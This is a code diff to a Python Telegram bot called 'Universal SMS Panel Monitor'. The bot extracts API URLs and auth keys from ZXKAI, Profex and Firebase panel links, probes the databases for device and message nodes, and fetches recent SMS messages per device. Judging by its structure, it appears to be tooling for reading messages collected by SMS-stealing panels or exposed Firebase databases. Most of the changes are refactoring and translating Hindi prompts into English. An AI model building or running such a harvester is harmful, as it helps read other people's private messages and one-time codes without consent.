@@ -113,6 +113,10 @@ def decode_profex(s):
 def get_panel_api_url(panel_url):
     """
     Extracts the internal API URL and Key from any panel link.
+    Supports:
+      - ZXKAI (s=...)
+      - Profex (s=...)
+      - Firebase (any .firebaseio.com URL, with optional auth)
     Returns (api_url, auth_key)
     """
     parsed = urlparse(panel_url)
@@ -129,13 +133,15 @@ def get_panel_api_url(panel_url):
     
     # 3. Try standard Firebase patterns
     if ".firebaseio.com" in parsed.netloc:
-        url = panel_url.split('?')[0].split('.json')[0].rstrip('/')
-        key = ""
+        # Remove any .json suffix and query string
+        base = panel_url.split('?')[0].split('.json')[0].rstrip('/')
+        # Extract auth from query
+        auth = ""
         for k, v in qs.items():
-            if k.lower() in ['key', 'auth', 'secret']:
-                key = v[0]
+            if k.lower() in ['auth', 'key', 'secret']:
+                auth = v[0]
                 break
-        return url, key
+        return base, auth
     
     return None, None
 
@@ -161,12 +167,14 @@ def is_valid_device_id(k):
 async def discover_structure(client, api_url, auth_key):
     """
     Tries to find where devices and messages are stored.
-    Returns (device_node, message_node)
+    Returns (device_node, message_node) or (None, error)
     """
     auth_suffix = f"?auth={auth_key}" if auth_key else ""
     
     # 1. Check root
     root_data, error = await api_fetch(client, f"{api_url}/.json{auth_suffix}&shallow=true")
+    if error:
+        return None, error
     if root_data and isinstance(root_data, dict):
         keys = list(root_data.keys())
         # Look for device IDs at root
@@ -175,7 +183,7 @@ async def discover_structure(client, api_url, auth_key):
             # If devices are at root, check where messages are
             for m_node in ["messages", "sms", "logs"]:
                 if m_node in keys: return "", m_node
-            return "", "" # Both at root
+            return "", ""  # Both at root
             
         # Check common sub-nodes
         for node in ["clients", "devices", "users", "all_devices", "nodes"]:
@@ -192,11 +200,10 @@ async def discover_structure(client, api_url, auth_key):
                                 break
                         return node, msg_node
                         
-    return None, error
+    return None, None
 
 async def get_device_list(client, api_url, auth_key, device_node):
     auth_suffix = f"?auth={auth_key}" if auth_key else ""
-    # FIX: Ensure slash before .json
     path = f"/{device_node}" if device_node else ""
     url = f"{api_url}{path}/.json{auth_suffix}&shallow=true"
     data, error = await api_fetch(client, url, 15)
@@ -207,7 +214,6 @@ async def get_device_list(client, api_url, auth_key, device_node):
 async def get_messages(client, api_url, auth_key, message_node, device_id, limit: int = 5) -> dict:
     auth_suffix = f"&auth={auth_key}" if auth_key else ""
     path = f"/{message_node}" if message_node else ""
-    # FIX: Ensure correct path construction
     url = f'{api_url}{path}/{device_id}/.json?orderBy="%24key"&limitToLast={limit}{auth_suffix}'
     data, _ = await api_fetch(client, url, 15)
     return data or {}
@@ -407,11 +413,12 @@ async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     keyboard = ReplyKeyboardMarkup([["📊 Status", "📋 My Panels"], ["➕ Add Panel", "❌ Remove Panel"]], resize_keyboard=True)
     await update.message.reply_text(
         "🤖 *Universal SMS Panel Monitor*\n\n"
-        "✅ Sabhi panels (ZXKAI, Profex, Firebase) supported hain.\n\n"
+        "✅ All panel types supported (ZXKAI, Profex, Firebase).\n\n"
         "• 📊 Status — Panel check\n"
         "• 📋 My Panels — Panel list\n"
-        "• ➕ Add Panel — Add multiple links\n"
+        "• ➕ Add Panel — Add multiple links (one per line)\n"
         "• ❌ Remove Panel — Delete panel\n\n"
+        "📌 *Firebase URLs:* Paste the full database URL (e.g., `https://project.firebaseio.com/` or with `?auth=...`)\n\n"
         f"👤 *Your Chat ID:* `{chat_id}`",
         parse_mode="Markdown", reply_markup=keyboard
     )
@@ -466,7 +473,16 @@ async def my_panels_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(text, parse_mode="Markdown")
 
 async def handle_add_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("➕ *Add New Panels*\n\nLinks bhejein (har link nayi line par).", parse_mode="Markdown")
+    await update.message.reply_text(
+        "➕ *Add New Panels*\n\n"
+        "Send the panel links, one per line.\n"
+        "Supported formats:\n"
+        "- ZXKAI: `...?s=...`\n"
+        "- Profex: `...?s=...`\n"
+        "- Firebase: `https://project.firebaseio.com/` (optionally with `?auth=...`)\n\n"
+        "Reply with your links.",
+        parse_mode="Markdown"
+    )
     context.user_data["awaiting_url"] = True
 
 async def handle_remove_panel(update: Update, context: ContextTypes.DEFAULT_TYPE):
@@ -498,9 +514,11 @@ async def handle_text_message(update: Update, context: ContextTypes.DEFAULT_TYPE
         added = 0
         async with httpx.AsyncClient() as client:
             for link in links:
-                if not link.startswith('http'): continue
+                if not link.startswith('http'):
+                    continue
                 api_url, auth_key = get_panel_api_url(link)
-                if not api_url: continue
+                if not api_url:
+                    continue
                 
                 # Discovery
                 dev_node, msg_node = await discover_structure(client, api_url, auth_key)
